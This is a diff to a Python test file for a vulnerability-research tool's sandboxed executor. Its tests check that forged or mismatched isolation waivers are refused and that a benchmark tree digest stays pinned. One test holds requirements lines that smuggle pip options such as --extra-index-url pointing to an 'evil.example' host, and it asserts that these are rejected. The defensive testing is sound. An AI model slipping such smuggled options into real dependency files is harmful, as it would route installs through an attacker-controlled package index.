@@ -791,9 +791,9 @@ def test_the_executor_refuses_a_weak_container_for_strong_isolation_runs(tmp_pat
     out = weak.run_isolated(["true"], image="img", mounts=[(str(tmp_path), "/target", "ro")], runner=runner,
                             requires_strong_isolation=True)
     assert out.status == "refused" and ran == []
-    waived = weak.run_isolated(["true"], image="img", mounts=[(str(tmp_path), "/target", "ro")], runner=runner,
+    forged = weak.run_isolated(["true"], image="img", mounts=[(str(tmp_path), "/target", "ro")], runner=runner,
                                requires_strong_isolation=True, waiver={"id": "w", "reason": "synthetic"})
-    assert waived.status == "completed" and len(ran) == 1
+    assert forged.status == "refused" and ran == [], "a waiver the config does not hold lets nothing run"
     strong = SandboxExecutor(config={"enabled": True, "isolated": {"oci_runtime": "runsc"},
                                      "audit_all_executions": False})
     assert strong.run_isolated(["true"], image="img", mounts=[(str(tmp_path), "/target", "ro")], runner=runner,
@@ -937,3 +937,92 @@ def test_the_records_name_what_really_ran_and_what_really_exists(vr):
             assert f"{m}_vr_events" in migrations, (rel, m)
         for doc in _re.findall(r"docs/features/[\w.-]+\.md", text):
             assert (ROOT / doc).exists(), (rel, doc)
+
+
+# ── re-review: the waiver is pinned to the committed benchmark tree ───────────
+
+
+def test_the_benchmark_tree_digest_is_pinned_and_current():
+    """args/vuln_research.yaml pins the committed benchmark's tree digest; a stale pin fails here (and in CI)."""
+    from tools.vulnresearch import targets
+
+    cfg = targets.load_config()
+    pin = cfg["benchmark"]["tree_digest"]
+    assert pin == targets.tree((ROOT / BENCH).resolve(), cfg)["digest"], (
+        "the benchmark changed: re-pin with python tools/vulnresearch/cli.py benchmark-digest --write, after review")
+    from tools.vulnresearch import cli
+
+    assert cli.main(["benchmark-digest", "--check"]) == 0
+
+
+def test_the_waiver_needs_the_pinned_benchmark_tree_not_just_its_path(vr, monkeypatch):
+    """An edited benchmark (any tree whose digest is not the pin) never runs under the waiver."""
+    from tools.vulnresearch import discovery, pov, targets
+
+    tid = _bench()
+    scoped = targets.assert_in_scope(tid)
+    assert targets.is_synthetic_benchmark(scoped) and pov.isolation_decision(scoped)["allowed"]
+    real = targets.load_config
+
+    def moved(path=None):
+        cfg = real(path)
+        cfg["benchmark"]["tree_digest"] = "e" * 64      # as if the files under the path had been edited
+        return cfg
+
+    monkeypatch.setattr(targets, "load_config", moved)
+    assert not targets.is_synthetic_benchmark(scoped)
+    with pytest.raises(discovery.RunRefused) as exc:
+        discovery.run(tid, REGISTRANT, use_model=False)
+    assert exc.value.code == "isolation"
+
+
+def test_the_executor_checks_a_waiver_against_config_and_the_pinned_tree(tmp_path):
+    from tools.security.sandbox_executor import SandboxExecutor
+    from tools.vulnresearch import targets
+
+    ran = []
+
+    def runner(cmd, **kw):
+        ran.append(cmd)
+        return SimpleNamespace(returncode=0, stdout="", stderr="")
+
+    ex = SandboxExecutor(config={"enabled": True, "isolated": {}, "audit_all_executions": False})
+    bench = str((ROOT / BENCH).resolve())
+    pin = targets.load_config()["benchmark"]["tree_digest"]
+    real_w = targets.load_config()["isolation"]["waivers"][0]
+    cases = [
+        ({"id": "forged", "reason": "any"}, bench, pin),            # an id the config does not hold
+        (dict(real_w), str(tmp_path), pin),                         # the real waiver, another tree mounted
+        (dict(real_w), bench, "e" * 64),                            # a tree digest that is not the pin
+    ]
+    (tmp_path / "x.py").write_text("print(1)\n")
+    for waiver, mount, digest in cases:
+        out = ex.run_isolated(["true"], image="img", mounts=[(mount, "/target", "ro")], runner=runner,
+                              requires_strong_isolation=True, waiver=waiver, waiver_tree_digest=digest)
+        assert out.status == "refused", (waiver.get("id"), mount, out.error)
+    assert ran == []
+    ok = ex.run_isolated(["true"], image="img", mounts=[(bench, "/target", "ro")], runner=runner,
+                         requires_strong_isolation=True, waiver=dict(real_w), waiver_tree_digest=pin)
+    assert ok.status == "completed" and len(ran) == 1
+
+
+def test_a_marker_cannot_smuggle_a_pip_option(vr):
+    from tools.vulnresearch import discovery
+
+    for line in ('requests==2.0 ; python_version > "3" --extra-index-url https://evil.example/simple',
+                 "requests==2.0 ; python_version > '3' -i https://evil.example",
+                 "requests==2.0 ; sys_platform == 'linux' --trusted-host evil"):
+        pins, refused, _ = discovery.vet_requirements(line)
+        assert refused and pins == [], line
+    pins, refused, _ = discovery.vet_requirements("jinja2==2.10 ; python_version >= '3.8'")
+    assert pins and not refused
+
+
+def test_the_enforce_mcp_tool_refuses_a_sandbox_pov_too(vr):
+    from tools.mcp.gap_handlers import handle_finding_enforce_reproduction
+
+    out = handle_finding_enforce_reproduction({"findings": [
+        {"finding_key": "x", "kind": "dynamic", "reproduction": {"kind": "sandbox_pov", "target": "vrt-0000000000",
+                                                                   "steps": [{"input": "pov"}]}}]})
+    assert out.get("refused") is True and "sandbox_pov" in out["error"]
+    assert LocalDouble.calls == []
